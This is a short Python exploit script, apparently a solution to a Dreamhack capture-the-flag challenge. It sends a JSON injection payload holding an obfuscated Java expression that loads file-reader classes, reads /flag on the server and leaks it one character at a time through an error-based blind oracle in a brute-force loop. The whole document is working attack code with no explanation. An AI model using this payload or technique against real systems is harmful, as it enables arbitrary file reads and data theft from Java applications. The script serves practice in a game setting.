import string
import requests as req
from tqdm import tqdm
payload = r'tmp", "payload" : {"@type" : "com.ctf.invitation.invitation.exception.InvalidKeyException", "message" : "(#cl=#this.getClass().getClassLoader(),#frCls=#cl.loadClass(new String(new char[]{106,97,118,97,46,105,111,46,70,105,108,101,82,101,97,100,101,114})),#brCls=#cl.loadClass(new String(new char[]{106,97,118,97,46,105,111,46,66,117,102,102,101,114,101,100,82,101,97,100,101,114})),#p=new String(new char[]{47, 102, 108, 97, 103}),#strCls=#p.getClass(),#cons1=(#frCls.getDeclaredConstructors())[4], #fr=#cons1.newInstance(#p), #cons2=(#brCls.getDeclaredConstructors())[1], #br=#cons2.newInstance(#fr), #flag=#br.readLine(), #fa=#flag.toCharArray(), #tf = (#fa[*index*]==*value*), #x=1/#tf)"}, "nothing" : "aa'

url = "http://host3.dreamhack.games:16419"
S = ""
for i in range(100):
    for ch in tqdm(string.printable):
        res = req.post(url+"/write", data={
            "host" : payload.replace("*index*", f"{i}").replace("*value*", f"{ord(ch)}"),
            "date" : "2222-02-02",
            "location" : "here",
            "description" : "...",
        })
        if "error" not in res.text:
            S += ch
            print(S)
            break
    else:
        break